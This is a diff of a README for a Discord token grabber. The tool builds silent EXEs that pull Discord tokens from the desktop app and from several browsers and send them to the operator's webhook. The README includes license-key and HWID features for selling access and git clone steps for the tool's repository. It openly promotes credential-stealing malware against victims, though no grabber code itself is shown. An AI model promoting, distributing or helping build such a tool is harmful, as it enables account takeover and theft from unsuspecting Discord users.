@@ -1,28 +1,35 @@
-# 🎯 Discord Token Grabber
+# 🔥 Discord Token Grabber (Silent EXE Builder)
 
-A powerful Discord token grabber with built-in license system. Generate silent EXEs that steal Discord tokens from victims.
+A powerful, automated tool to build **silent** EXE files that extract Discord tokens from local storage and send them to your webhook. Includes a built-in licensing system.
 
-## ✨ Features
+## 👑 Creator
+- **Developed by:** `aroscripts2511`
+- **Repository:** [aroscripts2511/Discord-T0k3n-Grabber](https://github.com/aroscripts2511/Discord-T0k3n-Grabber)
 
-- 🔐 **License System** - Generate and manage license keys
-- ⏰ **Time-Limited Keys** - Set expiry times for licenses
-- 🖥️ **HWID Binding** - Keys lock to specific devices
-- 🔨 **Silent EXE Builder** - Build invisible token grabbers
-- 🌐 **Browser Support** - Grabs tokens from Chrome, Firefox, Edge, Brave
-- 📱 **Discord App Support** - Grabs tokens from Discord desktop app
-- 🎨 **Themes** - Multiple color themes (Neon, Dark, Matrix, Ocean, Sunset)
-- 📬 **Webhook Support** - Send stolen tokens to Discord webhooks
+---
 
-## 📥 Installation
+## 🚀 Features
 
-### Method 1: Run from Source (Python Required)
+*   **Silent EXE Builder:** Build a standalone EXE that runs invisibly.
+*   **Token Theft:** Extracts tokens from Discord Desktop App, Chrome, Edge, Brave, and Firefox.
+*   **Webhook Support:** Sends all captured tokens directly to your Discord webhook.
+*   **Built-in License System:**
+    *   Admin panel to generate keys (`--admin`).
+    *   Keys can expire and are bound to the user's hardware ID (HWID).
+*   **Trial Key Generator:** Users without a key can generate a 1-hour trial directly from the script.
+*   **Customizable Themes:** Choose from a variety of terminal themes (Neon, Dark, Matrix, Ocean, etc.).
+*   **User-Friendly GUI:** Simple console menu for setting webhooks, building EXEs, and managing settings.
+
+---
+
+## 📥 Installation & Usage
+
+### 1. Prerequisites
+Make sure you have **Python 3.6+** installed on your system.
+*   [Download Python from python.org](https://python.org)
+
+### 2. Download the Script
+Clone this repository or download it as a ZIP:
 ```bash
-# Clone the repository
-git clone https://github.com/YOUR_USERNAME/token-grabber.git
-cd token-grabber
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run
-python token_grabber.py
+git clone https://github.com/aroscripts2511/Discord-T0k3n-Grabber.git
+cd Discord-T0k3n-Grabber
